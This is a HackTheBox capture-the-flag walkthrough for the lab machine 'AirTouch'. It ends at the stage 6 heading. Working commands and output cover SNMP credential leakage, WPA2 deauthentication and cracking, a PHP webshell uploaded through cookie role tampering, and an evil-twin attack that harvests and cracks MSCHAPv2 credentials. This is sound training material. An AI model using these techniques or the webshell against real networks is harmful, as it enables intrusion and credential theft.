# HackTheBox — AirTouch (Medium, Linux)

**Target IP:** `10.129.xx.xx`
**VPN/Attacker IP:** `10.10.xx.xx`

---

## 1. Reconnaissance

### 1.1 TCP Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 13:01 +0545
Nmap scan report for 10.129.xx.xx
Host is up (0.71s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 <REDACTED_FINGERPRINT> (RSA)
|   256 <REDACTED_FINGERPRINT> (ECDSA)
|_  256 <REDACTED_FINGERPRINT> (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.73 seconds
```

Only SSH is open over TCP. A UDP scan is needed to find more.

### 1.2 UDP Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx -sU
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 13:02 +0545
Nmap scan report for 10.129.xx.xx (10.129.xx.xx)
Host is up (0.25s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT      STATE         SERVICE VERSION
68/udp    open|filtered dhcpc
161/udp   open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 821dfa13c994856900000000
|   snmpEngineBoots: 1
|_  snmpEngineTime: 22m46s
| snmp-sysdescr: "The default consultant password is: <REDACTED_PASSWORD> (change it after use it)"
|_  System uptime: 22m46.36s (136636 timeticks)
8010/udp  open|filtered unknown
20120/udp open|filtered unknown
Service Info: Host: Consultant

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1189.66 seconds
```

The exposed **SNMP** service (community string `public`) leaks its system description, which directly contains a **plaintext default password for the `consultant` user**.

---

## 2. Initial Foothold — SSH as consultant

```bash
ssh consultant@10.129.xx.xx
```

```
The authenticity of host '10.129.xx.xx (10.129.xx.xx)' can't be established.
ED25519 key fingerprint is: SHA256:<REDACTED>
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.xx.xx' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
consultant@10.129.xx.xx's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

consultant@AirTouch-Consultant:~
```

The credentials leaked via SNMP grant SSH access.

### 2.1 Checking sudo Privileges

```bash
consultant@AirTouch-Consultant:~$ sudo -l
```

```
Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
```

`consultant` has unrestricted, passwordless `sudo` — trivial root on this particular host (a dedicated "consultant" VM, not the actual target infrastructure).

```bash
consultant@AirTouch-Consultant:~$ sudo su
root@AirTouch-Consultant:/home/consultant#
```

This box is purpose-built as a **wireless attack platform** (a "consultant laptop" with WiFi adapters), so root here is just the starting point for the real objective — pivoting into the simulated corporate wireless network.

---

## 3. Wireless Recon — Identifying Attack Tooling & Interfaces

### 3.1 Available Tooling

```bash
root@AirTouch-Consultant:~# ls
eaphammer
```

`eaphammer` — a tool for Evil Twin / rogue access point and WPA-Enterprise credential harvesting attacks — is present in the home directory.

### 3.2 Wireless Interfaces

```bash
root@AirTouch-Consultant:~/eaphammer# ip a s
```

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0@if29: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 76:a8:1d:df:3f:01 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.1.2/24 brd 172.20.1.255 scope global eth0
       valid_lft forever preferred_lft forever
7: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: wlan1: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
9: wlan2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
10: wlan3: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
11: wlan4: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
12: wlan5: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
13: wlan6: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
```

Multiple virtual wireless adapters (`wlan0`–`wlan6`) are available for simultaneous attack/monitoring roles.

Enable monitor mode on the first adapter:

```bash
airmon-ng start wlan0
```

---

## 4. Stage 1 — Cracking the "AirTouch-Internet" WPA2-PSK Network

### 4.1 Standing Up a Rogue AP (Initial Setup Attempt)

```bash
root@AirTouch-Consultant:~/eaphammer/local/hostapd-eaphammer/hostapd# touch hostapd.accept hostapd.deny
root@AirTouch-Consultant:~/eaphammer/local/hostapd-eaphammer/hostapd# chmod 644 hostapd.accept hostapd.deny
root@AirTouch-Consultant:~/eaphammer/local/hostapd-eaphammer/hostapd# echo "ff:ff:ff:ff:ff:ff" > hostapd.accept
root@AirTouch-Consultant:~/eaphammer/local/hostapd-eaphammer/hostapd# sed -i "s/ssid=test/ssid=AirTouch-Corporate/" hostapd.conf
```

Checking the resulting configuration:

```bash
root@AirTouch-Consultant:~/eaphammer/local/hostapd-eaphammer/hostapd# grep -n "accept_mac_file\|deny_mac_file" hostapd.conf
```
```
289:accept_mac_file=/root/owe/eaphammer/local/hostapd-eaphammer/hostapd.accept
290:deny_mac_file=/root/owe/eaphammer/local/hostapd-eaphammer/hostapd.deny
1280:# VLANID as a string). Optionally, the local MAC ACL list (accept_mac_file) can
1284:# 0 = disabled (default); only VLAN IDs from accept_mac_file will be used
```

The paths in the config don't match the actual working directory — they need correcting before the rogue AP will function properly.

```bash
root@AirTouch-Consultant:~/eaphammer/local/hostapd-eaphammer/hostapd# cd ~/eaphammer/local/hostapd-eaphammer/hostapd && \
> sed -i '88s/.*/ssid=AirTouch-Corporate/' hostapd.conf && \
> sed -i "289s|.*|accept_mac_file=$(pwd)/hostapd.accept|" hostapd.conf && \
> sed -i "290s|.*|deny_mac_file=$(pwd)/hostapd.deny|" hostapd.conf && \
> echo "FF:FF:FF:FF:FF:FF" > hostapd.accept && \
> ./hostapd-eaphammer -i wlan0mon hostapd.conf
```

```
Configuration file: hostapd.conf
addr_str: FF:FF:FF:FF:FF:FF
mask_str: ff:ff:ff:ff:ff:ff
vlan_id: 0
addr_str: 00:20:30:40:50:60
mask_str: ff:ff:ff:ff:ff:ff
vlan_id: 0
addr_str: 00:ab:cd:ef:12:34
mask_str: ff:ff:ff:ff:ff:ff
vlan_id: 0
addr_str: 00:00:30:40:50:60
mask_str: ff:ff:ff:ff:ff:ff
vlan_id: 0
rfkill: Cannot open RFKILL control device
Using interface wlan0 with hwaddr 42:00:00:00:00:00 and ssid "AirTouch-Corporate"
wlan0mon: interface state UNINITIALIZED->ENABLED
wlan0mon: AP-ENABLED
```

The rogue AP is now active (used here mainly to validate the toolchain; the real attack path pursued is WPA2-PSK handshake capture/cracking against the legitimate networks observed in range).

### 4.2 Surveying Nearby Networks

From another terminal:

```bash
root@AirTouch-Consultant:~# airodump-ng wlan0mon
```

```
ioctl(SIOCSIWMODE) failed: Device or resource busy

 CH  6 ][ Elapsed: 18 s ][ 2026-02-06 08:45

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 12:AD:54:D4:A6:5B  -28       13        0    0   6   54        CCMP   PSK  WIFI-JOHN
 F0:9F:C2:A3:F1:A7  -28       14       10    0   6   54        CCMP   PSK  AirTouch-Internet
 9A:60:AE:41:BF:89  -28       14        0    0   9   54   WPA2 CCMP   PSK  MiFibra-24-D4VY
 5A:4F:8A:C3:0D:04  -28       30        0    0   3   54        CCMP   PSK  MOVISTAR_FG68
 CA:07:B8:61:42:C3  -28       15        0    0   1   54        TKIP   PSK  vodafoneFB6N

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   28:6C:07:12:EE:F3  -29    0 - 1      0        4         AirTouch-Office
 F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29    6 -54      0       10
```

The target's networks are visible: **AirTouch-Internet** (WPA2-PSK) on BSSID `F0:9F:C2:A3:F1:A7`, channel 6, and **AirTouch-Office** (visible as a probe, suggesting WPA-Enterprise — pursued later).

### 4.3 Capturing the WPA2 Handshake

```bash
root@AirTouch-Consultant:~# airodump-ng --bssid F0:9F:C2:A3:F1:A7 --channel 6 -w handshake wlan0mon
```

```
08:46:12  Created capture file "handshake-01.cap".

 CH  6 ][ Elapsed: 4 mins ][ 2026-02-06 08:50 ][ WPA handshake: F0:9F:C2:A3:F1:A7

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:A3:F1:A7  -28   0     2393      110    0   6   54        CCMP   PSK  AirTouch-Internet

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29   54 -36      0     1397  EAPOL  AirTouch-Internet
Quitting...
```

A WPA handshake is captured.

### 4.4 Forcing a Handshake via Deauthentication

From a third terminal, deauth the connected client to force a re-authentication (and thus a fresh handshake):

```bash
root@AirTouch-Consultant:~# aireplay-ng --ignore-negative-one -0 10 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan0
```

```
08:49:50  Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6
08:49:51  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:51  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:52  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:52  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:53  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:53  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:54  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:54  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:55  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
08:49:55  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs]
```

### 4.5 Cracking the PSK

A copy of `rockyou.txt` is transferred from the attacker machine to the consultant box, then used against the captured handshake:

```bash
aircrack-ng -w /home/consultant/rockyou.txt -b F0:9F:C2:A3:F1:A7 handshake-01.cap
```

```
                               Aircrack-ng 1.6

      [00:00:04] 21160/14344392 keys tested (5282.84 k/s)

      Time left: 45 minutes, 11 seconds                          0.15%

                           KEY FOUND! [ <REDACTED_WPA_PASSPHRASE> ]


      Master Key     : <REDACTED>
      Transient Key  : <REDACTED>
      EAPOL HMAC     : <REDACTED>
```

The WPA2-PSK passphrase for `AirTouch-Internet` is recovered.

---

## 5. Stage 2 — Joining the Internal Network & Web App Exploitation

### 5.1 Associating with the Cracked Network

```bash
root@AirTouch-Consultant:~# wpa_passphrase "AirTouch-Internet" "<REDACTED_WPA_PASSPHRASE>" > /tmp/wlan.conf
root@AirTouch-Consultant:~# wpa_supplicant -B -i wlan1 -c /tmp/wlan.conf
```
```
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```

```bash
root@AirTouch-Consultant:~# dhclient wlan1
root@AirTouch-Consultant:~# ip addr show wlan1
```
```
4: wlan1: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.3.48/24 brd 192.168.3.255 scope global dynamic wlan0
       valid_lft 86391sec preferred_lft 86391sec
    inet6 fe80::4000:ff:fe00:0/64 scope link
       valid_lft forever preferred_lft forever
```

We now have a live IP address (`192.168.3.48`) on the internal WiFi network.

### 5.2 Discovering Internal Hosts

```bash
root@AirTouch-Consultant:~# nmap -sn 192.168.3.0/24
```
```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-06 09:05 UTC
Nmap scan report for 192.168.3.1
Host is up (0.00021s latency).
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)
Nmap scan report for 192.168.3.48
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 26.03 seconds
```

```bash
root@AirTouch-Consultant:~# nmap -sV -sC 192.168.3.1
```
```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-06 09:07 UTC
Nmap scan report for 192.168.3.1
Host is up (0.000029s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  dnsmasq 2.90
| dns-nsid:
|_  bind.version: dnsmasq-2.90
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: WiFi Router Configuration
|_Requested resource was login.php
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.21 seconds
```

The router's gateway (`192.168.3.1`) hosts a "WiFi Router Configuration" web app on port 80 — the likely target.

### 5.3 Pivoting the Web App via SSH Local Port Forward

Since this internal network is only reachable through the consultant box, we tunnel the router's web UI back to our own machine:

```bash
ssh -L 9000:192.168.3.1:80 consultant@10.129.xx.xx
```

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
consultant@10.129.xx.xx's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Feb 12 05:20:35 2026 from 10.10.xx.xx
consultant@AirTouch-Consultant:~$
```

Confirming the tunnel works:

```bash
curl -v http://localhost:9000
```
```
* Host localhost:9000 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:9000...
* Established connection to localhost (::1 port 9000) from ::1 port 36772
* using HTTP/1.x
> GET / HTTP/1.1
> Host: localhost:9000
> User-Agent: curl/8.18.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Thu, 12 Feb 2026 05:21:16 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=<REDACTED_SESSION_ID>; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< location: login.php
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host localhost:9000 left intact
```

Using the pcap file from previous attack, we download it and recover a PHPSESSID for manager.


<img width="746" height="622" alt="1" src="https://github.com/user-attachments/assets/d9e9a8d6-bdc7-48d2-b788-6824dcb8e75c" />
<img width="1276" height="527" alt="2" src="https://github.com/user-attachments/assets/228047d3-7869-4185-bb0b-08dca5897860" />
<img width="750" height="945" alt="3" src="https://github.com/user-attachments/assets/5cf2f3a4-0618-4852-8e45-1ef12cf50152" />
<img width="932" height="926" alt="4" src="https://github.com/user-attachments/assets/0e86c0a9-8aa0-45f4-bddf-1219d0af6d00" />

By simpling changing the role to admin in cookie, we get admin access allowing to upload the file.


### 5.4 Uploading a Webshell

A PHP webshell is prepared:

```bash
cat shell.phtml
```
```php
<?php system($_GET['c']); ?>
```

Using a session cookie with an elevated `UserRole=admin` value (obtained from prior application analysis), the shell is uploaded via the router's file upload feature:

```bash
curl -b "PHPSESSID=<REDACTED_SESSION_ID>;UserRole=admin" \
-F "fileToUpload=@shell.phtml" \
-F "submit=Upload File" \
http://localhost:9000/index.php
```

```html
<!DOCTYPE html>
<html>

<head>
    <title>WiFi Router Configuration</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
...
```

The upload succeeds.

### 5.5 Executing Commands via the Webshell

```bash
curl "http://localhost:9000/uploads/shell.phtml?c=id"
```
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Code execution confirmed as `www-data`.

### 5.6 Harvesting Application Credentials

```bash
curl "http://localhost:9000/uploads/shell.phtml?c=cat+/var/www/html/login.php"
```

```php
<?php session_start(); /* Starts the session */

// Check if user is already logged in
if (isset($_SESSION['UserData']['Username'])) {
  header("Location:index.php"); // Redirect to index.php
  exit; // Make sure to exit after redirection
}

session_start();


if (isset($_POST['Submit'])) {
  /* Define username, associated password, and user attribute array */
  $logins = array(
    /*'user' => array('password' => '<REDACTED>', 'role' => 'admin'),*/
    'manager' => array('password' => '<REDACTED>', 'role' => 'user')
  );

  /* Check and assign submitted Username and Password to new variable */
  $Username = isset($_POST['Username']) ? $_POST['Username'] : '';
  $Password = isset($_POST['Password']) ? $_POST['Password'] : '';
...
```

The application's source reveals hardcoded credentials, including a commented-out `user`/admin entry and an active `manager` account.

---

## 6. Stage 3 — Router Shell Access (AirTouch-AP-PSK)

The router also exposes SSH; with credentials gathered/leaked along the way (e.g., reused passwords from the SNMP/PHP findings), we connect directly:

```bash
root@AirTouch-Consultant:~# ssh user@192.168.3.1
```

```
The authenticity of host '192.168.3.1 (192.168.3.1)' can't be established.
ECDSA key fingerprint is SHA256:<REDACTED>
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.3.1' (ECDSA) to the list of known hosts.
user@192.168.3.1's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

user@AirTouch-AP-PSK:~$
```

### 6.1 Privilege Escalation

```bash
user@AirTouch-AP-PSK:~$ sudo -l
```
```
Matching Defaults entries for user on AirTouch-AP-PSK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on AirTouch-AP-PSK:
    (ALL) NOPASSWD: ALL
```

```bash
user@AirTouch-AP-PSK:~$ sudo -i
root@AirTouch-AP-PSK:~#
```

### 6.2 User Flag (AirTouch-AP-PSK)

```bash
root@AirTouch-AP-PSK:~# cat user.txt
```
```
<REDACTED_USER_FLAG>
```

### 6.3 Discovering Certificates and a Sync Script

```bash
root@AirTouch-AP-PSK:~# ls certs-backup/
```
```
ca.conf  ca.crt  server.conf  server.crt  server.csr  server.ext  server.key
```

A full TLS certificate chain (CA cert, server cert, and **private key**) is present — useful for impersonating the legitimate RADIUS/EAP server in the next stage.

```bash
root@AirTouch-AP-PSK:~# cat send_certs.sh
```
```bash
#!/bin/bash

# DO NOT COPY
# Script to sync certs-backup folder to AirTouch-office.

# Define variables
REMOTE_USER="remote"
REMOTE_PASSWORD="<REDACTED_PASSWORD>"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"

# Use sshpass to send the folder via SCP
sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
```

This script reveals **another set of credentials** (`remote` user, plaintext password) for a host at `10.10.10.1` — presumably reachable once we're on the next internal segment (`AirTouch-Office`). It also confirms the certs are legitimately trusted by that environment.

---

## 7. Stage 4 — Evil Twin Attack Against "AirTouch-Office" (WPA-Enterprise)

### 7.1 Importing the Stolen Certificates into eaphammer

Back on the consultant box, the certificates retrieved from `AirTouch-AP-PSK` are imported into `eaphammer` so our rogue AP presents a certificate chain trusted by client devices configured for the legitimate `AirTouch-Office` network:

```bash
root@AirTouch-Consultant:~/eaphammer# ./eaphammer --cert-wizard import --server-cert server.crt --ca-cert ca.crt --private-key server.key
```

```
                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
Case 1: Import all separate
[CW] Ensuring server cert, CA cert, and private key are valid...
server.crt
server.key
ca.crt
[CW] Complete!
[CW] Loading private key from server.key
[CW] Complete!
[CW] Loading server cert from server.crt
[CW] Complete!
[CW] Loading CA certificate chain from ca.crt
[CW] Complete!
[CW] Constructing full certificate chain with integrated key...
[CW] Complete!
[CW] Writing private key and full certificate chain to file...
[CW] Complete!
[CW] Private key and full certificate chain written to: /root/eaphammer/certs/server/AirTouch CA.pem
[CW] Activating full certificate chain...
[CW] Complete!
```

### 7.2 Locating the Target Network

```bash
root@AirTouch-Consultant:~/eaphammer# airodump-ng --channel 44 wlan0mon
```

```
 CH 44 ][ Elapsed: 0 s ][ 2026-02-12 05:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 AC:8B:A9:AA:3F:D2  -28 100       37        4    1  44   54e  WPA2 CCMP   MGT  AirTouch-Office
 AC:8B:A9:F3:A1:13  -28   0       37        4    1  44   54e  WPA2 CCMP   MGT  AirTouch-Office

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 AC:8B:A9:AA:3F:D2  C8:8A:9A:6F:F9:D2  -29    0 -36e     0        4
 AC:8B:A9:F3:A1:13  28:6C:07:12:EE:A1  -29    0 - 6     28        5         AirTouch-Office
```

`AirTouch-Office` uses **WPA2-Enterprise (MGT)** — i.e., 802.1X/RADIUS authentication, typically using credentials tied to a domain user (here, `AirTouch\<username>`).

### 7.3 Launching the Evil Twin / Credential Harvesting AP

```bash
./eaphammer -i wlan4 --essid AirTouch-Office --channel 44 --auth wpa-eap --creds --negotiate balanced
```

```
                     .__
  ____ _____  ______ |  |__ _____    _____   _____   ___________
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
[*] Reticulating radio frequency splines...
Error: Could not create NMClient object: Could not connect: No such file or directory.

[*] Using nmcli to tell NetworkManager not to manage wlan4...

100%|████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan4 no longer controlled by NetworkManager.
[!] The hw_mode specified in hostapd.ini is invalid for the selected channel (g, 44)
[!] Falling back to hw_mode: a
[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-04-18-03-09-12-<REDACTED>.hccapx

[hostapd] AP starting...

Configuration file: /root/eaphammer/tmp/hostapd-2026-04-18-03-09-12-<REDACTED>.conf
rfkill: Cannot open RFKILL control device
wlan4: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan4 with hwaddr 00:11:22:33:44:00 and ssid "AirTouch-Office"
wlan4: interface state COUNTRY_UPDATE->ENABLED
wlan4: AP-ENABLED


Press enter to quit...

wlan4: STA 02:00:00:00:05:00 IEEE 802.11: authenticated
wlan4: STA 02:00:00:00:05:00 IEEE 802.11: associated (aid 1)
wlan4: CTRL-EVENT-EAP-STARTED 02:00:00:00:05:00
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25


mschapv2: Sat Apr 18 03:14:36 2026
         domain\username:               AirTouch\<REDACTED_USERNAME>
         username:                      <REDACTED_USERNAME>
         challenge:                     <REDACTED>
         response:                      <REDACTED>

         jtr NETNTLM:                   <REDACTED_USERNAME>:$NETNTLM$<REDACTED_HASH>

         hashcat NETNTLM:               <REDACTED_USERNAME>::::<REDACTED_HASH>
...
```

Because our rogue AP presents the **legitimate, trusted certificate chain** (stolen in Stage 3), client devices configured to auto-connect to `AirTouch-Office` associate with our fake AP and attempt PEAP/MSCHAPv2 authentication — leaking an **NTLM-format credential exchange (MSCHAPv2)** for a real domain user.

> Tip: if a target doesn't connect quickly, run a deauth attack against the legitimate APs from another terminal to force reconnection attempts toward the rogue AP.

### 7.4 Cracking the Captured Credential

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Warning: detected hash type "netntlm", but the string is also recognized as "netntlm-naive"
Use the "--format=netntlm-naive" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlm, NTLMv1 C/R [MD4 DES (ESS MD5) 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED_PASSWORD>       (<REDACTED_USERNAME>)
1g 0:00:00:00 DONE (2026-02-12 11:52) 4.761g/s 442000p/s 442000c/s 442000C/s polgara..ianpogi
Use the "--show --format=netntlm" options to display all of the cracked passwords reliably
Session completed.
```

The MSCHAPv2 challenge/response cracks successfully, recovering the plaintext password for the harvested domain account.

---

## 8. Stage 5 — Legitimately Joining AirTouch-Office & Reaching the Internal Management Network

### 8.1 Building a WPA-Enterprise Supplicant Config

```bash
root@AirTouch-Consultant:~# cat > office.conf << EOF
ctrl_interface=/var/run/wpa_supplicant
ap_scan=1
network={
    ssid="AirTouch-Office"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\\<REDACTED_USERNAME>"
    password="<REDACTED_PASSWORD>"
    phase1="peapver=0"
    phase2="auth=MSCHAPV2"
}
EOF
```

### 8.2 Connecting to the Real Network

```bash
root@AirTouch-Consultant:~# wpa_supplicant -B -i wlan5 -c office.conf
```
```
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```

```bash
root@AirTouch-Consultant:~# dhclient wlan5
root@AirTouch-Consultant:~# ip addr show wlan5
```
```
12: wlan5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.50/24 brd 10.10.10.255 scope global dynamic wlan5
       valid_lft 863993sec preferred_lft 863993sec
    inet6 fe80::ff:fe00:500/64 scope link
       valid_lft forever preferred_lft forever
```

We are now legitimately associated with the real `AirTouch-Office` network, landing on the `10.10.10.0/24` segment — the same network referenced in the `send_certs.sh` script from Stage 3.

### 8.3 Discovering the Management Host

```bash
root@AirTouch-Consultant:~# nmap -sn 10.10.10.0/24
```
```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-02-12 06:10 UTC
Nmap scan report for 10.10.10.1
Host is up (0.00013s latency).
MAC Address: AC:8B:A9:AA:3F:D2 (Unknown)
Nmap scan report for 10.10.10.50
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 26.02 seconds
```

`10.10.10.1` matches the host referenced in `send_certs.sh`.

---

## 9. Stage 6 — Final Privilege Escalation on AirTouch-AP-MGT

